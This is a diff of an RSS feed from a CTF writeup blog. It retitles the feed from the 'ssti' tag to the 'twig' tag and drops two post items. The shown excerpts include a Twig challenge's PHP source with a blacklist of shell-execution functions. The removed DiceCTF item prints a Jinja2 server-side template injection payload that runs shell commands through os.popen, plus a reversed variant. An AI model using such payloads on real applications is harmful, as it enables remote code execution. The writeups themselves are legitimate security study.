@@ -1,14 +1,14 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>ssti on j3seer</title>
-    <link>http://localhost:1313/tags/ssti/</link>
-    <description>Recent content in ssti on j3seer</description>
+    <title>twig on j3seer</title>
+    <link>http://localhost:1313/tags/twig/</link>
+    <description>Recent content in twig on j3seer</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <lastBuildDate>Sat, 09 Mar 2024 00:00:00 +0000</lastBuildDate>
     
-	<atom:link href="http://localhost:1313/tags/ssti/index.xml" rel="self" type="application/rss+xml" />
+	<atom:link href="http://localhost:1313/tags/twig/index.xml" rel="self" type="application/rss+xml" />
     
     
     <item>
@@ -22,30 +22,6 @@ Author: 0xM4hm0ud
  Had some time last weekend to play CyberSpace ctf 2024, and managed to solve TwigPlayground by 0xM4hm0ud
 Twig SSTI For this challenge, by reading the src we can tell any basic SSTI payload wont work.
 &amp;lt;?php ini_set(&amp;#39;display_errors&amp;#39;, 0); ini_set(&amp;#39;error_reporting&amp;#39;, 0); if ($_SERVER[&amp;#39;REQUEST_METHOD&amp;#39;] === &amp;#39;POST&amp;#39;) { require_once &amp;#39;vendor/autoload.php&amp;#39;; $loader = new \Twig\Loader\ArrayLoader([]); $twig = new \Twig\Environment($loader, [ &amp;#39;debug&amp;#39; =&amp;gt; true, ]); $twig-&amp;gt;addExtension(new \Twig\Extension\DebugExtension()); $context = [ &amp;#39;user&amp;#39; =&amp;gt; [ &amp;#39;name&amp;#39; =&amp;gt; &amp;#39;Wesley&amp;#39;, &amp;#39;age&amp;#39; =&amp;gt; 30, ], &amp;#39;items&amp;#39; =&amp;gt; [&amp;#39;Apple&amp;#39;, &amp;#39;Banana&amp;#39;, &amp;#39;Cherry&amp;#39;, &amp;#39;Dragonfruit&amp;#39;], ]; // Ensure no SSTI or RCE vulnerabilities  $blacklist = [&amp;#39;system&amp;#39;, &amp;#39;id&amp;#39;, &amp;#39;passthru&amp;#39;, &amp;#39;exec&amp;#39;, &amp;#39;shell_exec&amp;#39;, &amp;#39;popen&amp;#39;, &amp;#39;proc_open&amp;#39;, &amp;#39;pcntl_exec&amp;#39;, &amp;#39;_self&amp;#39;, &amp;#39;reduce&amp;#39;, &amp;#39;env&amp;#39;, &amp;#39;sort&amp;#39;, &amp;#39;map&amp;#39;, &amp;#39;filter&amp;#39;, &amp;#39;replace&amp;#39;, &amp;#39;encoding&amp;#39;, &amp;#39;include&amp;#39;, &amp;#39;file&amp;#39;, &amp;#39;run&amp;#39;, &amp;#39;Closure&amp;#39;, &amp;#39;Callable&amp;#39;, &amp;#39;Process&amp;#39;, &amp;#39;Symfony&amp;#39;, &amp;#39;\&amp;#39;&amp;#39;, &amp;#39;&amp;#34;&amp;#39;, &amp;#39;.</description>
-    </item>
-    
-    <item>
-      <title>Teach me - SparkCTF Writeup</title>
-      <link>http://localhost:1313/posts/sparkctf-2022-writeup/</link>
-      <pubDate>Mon, 05 Dec 2022 00:00:00 +0000</pubDate>
-      
-      <guid>http://localhost:1313/posts/sparkctf-2022-writeup/</guid>
-      <description>Description This challenge was about acheiving SSTI rce with an abstract way of getting the attributes and builtins. The idea was inspired from the GDG Algiers CTF 2022.
-I really loved the idea of using some abstract filter that can  &amp;ldquo;almost&amp;rdquo;  trully bypass any blacklist ( still need more research ) but the main thing is that we can now trully call any attribute using this trick and its rare that a blacklist would prevent you from using the map filter.</description>
-    </item>
-    
-    <item>
-      <title>DiceCTF@Hope 2022 - Writeup</title>
-      <link>http://localhost:1313/posts/dicectfhope_writeup/</link>
-      <pubDate>Thu, 29 Sep 2022 08:59:19 -0400</pubDate>
-      
-      <guid>http://localhost:1313/posts/dicectfhope_writeup/</guid>
-      <description>Mostly solved the web challenges with Task_Hashed
- Reverser the website is a text reverser and from the source code we can tell its an SSTI so we just have to put a regular SSTI payload but just reversed
-regular payload:
-{{config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()}} {{config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;cat flag-ccba9605-afeb-49a6-8aac-d56bac20705b.txt&#39;).read()}} supplied reversed payload:
-}} )(daer.)&#39;sl&#39;(nepop.]&#39;so&#39;[__slabolg__.__tini__.__ssalc__.gifnoc {{ }})(daer.)&#39;txt.b50702cab65d-caa8-6a94-befa-5069abcc-galf tac&#39;(nepop.]&#39;so&#39;[__slabolg__.__tini__.__ssalc__.gifnoc{{  Pastebin the important part of this challenge is :
-if (paste.search(/&amp;lt;.*&amp;gt;/) !== -1) { return res.redirect(&amp;#39;/flash?message=Illegal characters in paste!</description>
     </item>
     
   </channel>
